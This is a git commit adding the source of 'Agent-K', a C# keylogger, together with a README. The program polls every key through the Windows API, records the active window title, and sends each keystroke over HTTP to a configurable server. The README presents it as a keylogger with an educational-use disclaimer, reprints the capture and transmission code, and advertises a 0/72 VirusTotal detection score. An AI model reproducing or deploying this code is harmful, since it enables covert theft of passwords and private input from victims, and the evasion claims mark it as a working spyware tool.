b781b12c029e5b196d7fec0193ca8d550b785488
Hyunsung Ra <216290241+therustymate@users.noreply.github.com>
2025-07-29 12:28:12 +1200

    Agent-K 1.0.0

---
+++ Agent-K 1.0.0/Program.cs
@@ -0,0 +1,97 @@
+﻿﻿using System;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows;
+using System.Web;
+
+namespace Agent_K
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+
+
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+        public static List<int> KEY_STATE_LIST = new List<int>(){ 1, -32767, 32769 };
+        public static readonly Dictionary<int, string> SpecialKeys = new Dictionary<int, string>
+        {
+            { 1, "[LEFT_CLICK]" },
+            { 2, "[RIGHT_CLICK]" },
+            { 8, "[BACKSPACE]" },
+            { 9, "[TAB]" },
+            { 13, "[ENTER]" },
+            { 20, "[CAPS_LOCK]" },
+            { 27, "[ESC]" },
+            { 32, "[SPACE]" },
+            { 37, "[LEFT]" },
+            { 38, "[UP]" },
+            { 39, "[RIGHT]" },
+            { 40, "[DOWN]" },
+            { 46, "[DELETE]" },
+            { 186, "[;]" },
+            { 192, "[`]" },
+            { 222, "[']" }
+        };
+
+        public static string SERVER = "http://localhost";
+
+        private static void Main(string[] args)
+        {
+            Console.WriteLine("[*] Agent-K has been initialized.");
+            hanlder();
+        }
+
+        private static void hanlder() 
+        {
+            while (true)
+            {
+                for (int i = 0; i < 255; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (KEY_STATE_LIST.Contains(keyState))
+                    {
+                        string key = GetKeyString(i);
+                        string title = GetWinText();
+                        Console.WriteLine($"[*] Agent-K: [TITLE: {title}] [CHAR: {key}] [INDEX: {i}]");
+                        send(title, key, i);
+                    }
+                }
+            }
+        }
+
+        private static async void send(string title, string key, int i) 
+        {
+            HttpClient client = new HttpClient();
+            string encodedTitle = HttpUtility.UrlEncode(title);
+            string encodedKey = HttpUtility.UrlEncode(key);
+            string encodedIndex = HttpUtility.UrlEncode(i.ToString());
+            string url = $"{SERVER}?title={title}&char={encodedKey}&index={encodedIndex}";
+            HttpResponseMessage response = await client.GetAsync(url);
+        }
+
+        private static string GetWinText()
+        {
+            StringBuilder title = new StringBuilder(256);
+            IntPtr hWindow = GetForegroundWindow();
+            GetWindowText(hWindow, title, title.Capacity);
+            return title.ToString();
+        }
+
+        private static string GetKeyString(int index)
+        {
+            string result = "";
+            result = Char.ToString(Convert.ToChar(index));
+            if (SpecialKeys.ContainsKey(index)) {
+                result = SpecialKeys[index];
+            }
+            return result;
+        }
+    }
+}
--- README.md
+++ README.md
@@ -1,2 +1,60 @@
 # Agent-K
-Agent K - .NET Keylogger
+.NET C# Basic Keylogger
+
+## Disclaimer
+> This software is intended ***exclusively for educational purposes and ethical cybersecurity research***. It is designed to help users understand potential vulnerabilities in systems so they can improve their security.
+>
+> By using this software, you agree to use it in compliance with all applicable laws and regulations. Unauthorized use, distribution, or deployment of this software against any system without the explicit permission of the system owner is strictly prohibited and may result in criminal and civil penalties.
+>
+> The creator(s) of this software assume no liability and are not responsible for any misuse or damages arising from the use of this software. Always obtain proper authorization before testing or analyzing systems using this software.
+
+## Features
+1. Keystroke Logging
+* Captures all key presses.<br>
+**WinAPI GetAsyncKeyState() from user32.dll**
+```cs
+for (int i = 0; i < 255; i++)
+{
+    int keyState = GetAsyncKeyState(i);
+    if (KEY_STATE_LIST.Contains(keyState))
+    {
+        string key = GetKeyString(i);
+        ...
+    }
+}
+```
+
+2. Window Tracking
+Retrieves the title of the currently focused window.<br>
+**WinAPI GetForegroundWindow() from user32.dll**
+```cs
+private static string GetWinText()
+{
+    StringBuilder title = new StringBuilder(256);
+    IntPtr hWindow = GetForegroundWindow();
+    GetWindowText(hWindow, title, title.Capacity);
+    return title.ToString();
+}
+```
+
+3. Data Transmission
+* Sends the key data and window title to a remote server via HTTP.<br>
+**C# HttpClient (System.Web)**
+```cs
+private static async void send(string title, string key, int i) 
+{
+    HttpClient client = new HttpClient();
+    string encodedTitle = HttpUtility.UrlEncode(title);
+    string encodedKey = HttpUtility.UrlEncode(key);
+    string encodedIndex = HttpUtility.UrlEncode(i.ToString());
+    string url = $"{SERVER}?title={title}&char={encodedKey}&index={encodedIndex}";
+    HttpResponseMessage response = await client.GetAsync(url);
+}
+```
+
+## VirusTotal Score
+| Version           | Virus Total Link                  | Score             |
+|-------------------|-----------------------------------|-------------------|
+| Agent-K 1.0.0     | [f5331bde71228ed3604806ebcd0c6d9bb11c04ed8b76ae11cadd05bd7f5f9c58](https://www.virustotal.com/gui/file/f5331bde71228ed3604806ebcd0c6d9bb11c04ed8b76ae11cadd05bd7f5f9c58?nocache=1) | 0/72
+| Agent-K 1.0.0 ZIP | [a29eb2f65b674aa216e5a9c674b79b23bda5f466fb74b6048fa0c6da22380919](https://www.virustotal.com/gui/file/a29eb2f65b674aa216e5a9c674b79b23bda5f466fb74b6048fa0c6da22380919?nocache=1) | 0/72
+| Agent-K 1.0.0     | [c9e042bdf7db9aef8f296d765e8c179f037a27a2d2cf80b2183a2fb674c4e64c](https://www.virustotal.com/gui/file/c9e042bdf7db9aef8f296d765e8c179f037a27a2d2cf80b2183a2fb674c4e64c/detection) | 0/72
